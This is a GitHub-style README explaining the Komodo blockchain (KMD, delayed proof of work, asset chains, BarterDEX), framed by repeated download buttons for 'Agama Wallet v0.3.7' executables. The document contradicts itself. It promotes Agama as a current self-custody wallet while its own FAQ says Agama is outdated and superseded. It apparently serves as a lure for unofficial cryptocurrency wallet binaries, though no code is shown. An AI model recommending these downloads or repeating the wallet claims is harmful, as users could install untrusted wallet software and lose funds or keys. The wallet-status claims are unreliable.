[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# What Is Komodo? The Chain Behind KMD

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

Komodo is a blockchain platform built around KMD, with three ideas that distinguish it: delayed proof of work, which notarises its blocks onto Bitcoin, independent asset chains that run alongside the main chain, and a history of atomic-swap tooling. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem with built-in atomic swaps, and it sits at the wallet end of that stack.

## You'll see this if

A wallet, an explorer or a forum thread uses Komodo terminology that assumes knowledge of the platform: asset chains, notary nodes, notarisation heights.

| Term | What it means |
|---|---|
| KMD | The native coin of the Komodo chain |
| dPoW | Delayed proof of work: recording Komodo blocks onto Bitcoin |
| Notary nodes | The nodes that perform those recordings |
| Asset chain | An independent chain launched in the ecosystem |
| BarterDEX | The swap protocol that the ecosystem's wallets used |

## Why it happens

Komodo's design choices come from a specific goal: give a smaller chain some of Bitcoin's security without merging the two networks.

Delayed proof of work does that by having notary nodes write Komodo's block hashes into Bitcoin transactions. Once a Komodo block is referenced on Bitcoin, changing it would require rewriting Bitcoin as well, which is far more expensive than rewriting Komodo alone. The site presents this as protection against reorganisation and majority attacks, which is an accurate description of the intent rather than a guarantee of outcome.

Asset chains extend the same logic sideways. Rather than one chain hosting every application, each project can run its own chain with its own rules, while still relating to the ecosystem's infrastructure. That is why Komodo terminology appears in wallets that support more than one chain, and why a Komodo address and an asset-chain address are not the same thing. It is also why a balance shown for one chain says nothing about any other chain the same wallet supports, even when both appear together on one screen and one of them looks healthy.

The asset-chain model explains a question that otherwise looks strange: why a wallet for one platform lists so many tickers. Each asset chain is its own chain with its own supply and rules, launched by a project rather than issued as a token on a shared ledger. Supporting them means supporting several chains inside one interface.

Atomic swaps were the ecosystem's answer to exchange risk, and they predate the current wallet generation. [BarterDEX](https://github.com/agama-wallet/agama-wallet/blob/main/barterdex-protocol.md) covers the protocol, [Komodo dPoW](https://github.com/agama-wallet/agama-wallet/blob/main/delayed-proof-of-work.md) the notarisation, and [what KMD is](https://github.com/agama-wallet/agama-wallet/blob/main/what-kmd-does.md) the coin itself.

## Fix

Understanding the platform mostly means placing a name correctly.

1. **Separate the chain from the coin.** KMD is the asset; Komodo is the network it pays for.
2. **Separate the main chain from asset chains.** An asset chain has its own rules and its own addresses.
3. **Separate notarisation from consensus.** dPoW adds a reference point on Bitcoin; the chain still reaches its own consensus.
4. **Separate the wallets from the protocol.** The swap engine and the wallet that used it are different layers.
5. **Date the whole picture.** Komodo's wallet line has changed since 2019, and statements about "the Komodo wallet" are time-sensitive.

If a task involves recovering value from an old install, the platform's history matters more than its design: [moving KMD out of an old Agama wallet](https://github.com/agama-wallet/agama-wallet/blob/main/move-kmd-out-safely.md) is the practical path.

## If that did not work

If an address is rejected by a wallet, check which chain it belongs to before assuming corruption. Asset-chain and main-chain addresses are not interchangeable.

If a notarisation height seems to lag the chain, that is expected: it records periodically rather than continuously, so the newest blocks always sit outside the anchored range.

If a document describes Komodo's wallet as Agama, it predates mid-2019. The ecosystem's wallet has changed since, and the current one is not that.

If a swap service claims Komodo support, verify which chain and which asset it means. "Komodo" alone is ambiguous between the platform, the coin, an asset chain and the ecosystem's wallet, and each answer implies a different address format.

## Prevention

- **Learn the vocabulary before the interface.** Asset chain, notary node and dPoW explain most confusing screens.
- **Date every claim about the ecosystem's wallet.** The names are reused across generations.
- **Keep KMD and asset-chain balances separate in your notes.** They are different chains.
- **Do not assume notarisation means instant finality.** It is a periodic reference, not a confirmation service.
- **Treat swap protocol names as protocol names.** [AtomicDEX](https://github.com/agama-wallet/agama-wallet/blob/main/atomicdex-explained.md) explains how the exchange layer related to the wallet layer.

## FAQ

### Is Komodo a fork of Bitcoin?

It shares Bitcoin's UTXO accounting and much of its tooling, but it is a separate chain with its own consensus additions and its own asset.

### What does delayed proof of work actually protect against?

It makes rewriting Komodo's history require rewriting the Bitcoin history that references it, which raises the cost of a reorganisation or a majority attack.

### What is an asset chain?

An independent chain in the Komodo ecosystem with its own rules, related to the platform without being part of the main chain's ledger.

### What is the difference between an asset chain and a token?

A token lives inside another chain's ledger and depends on that chain's rules. An asset chain is a separate chain with its own blocks, supply and consensus, related to the platform rather than contained by it.

### Is Komodo still active?

The platform is active and its wallet line has moved on from the original Agama; Komodo is now part of the Gleec ecosystem, whose current wallet is Gleec Exchange Wallet.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [KMD Coin: What Komodo's Native Asset Does](https://github.com/agama-wallet/agama-wallet/blob/main/what-kmd-does.md)
- [Komodo dPoW: Notarising One Chain to Another](https://github.com/agama-wallet/agama-wallet/blob/main/delayed-proof-of-work.md)
- [BarterDEX: The Exchange Agama Shipped With](https://github.com/agama-wallet/agama-wallet/blob/main/barterdex-protocol.md)
- [Komodo Wallet: What It Is and How KMD Works](https://github.com/agama-wallet/agama-wallet/blob/main/komodo-and-kmd.md)
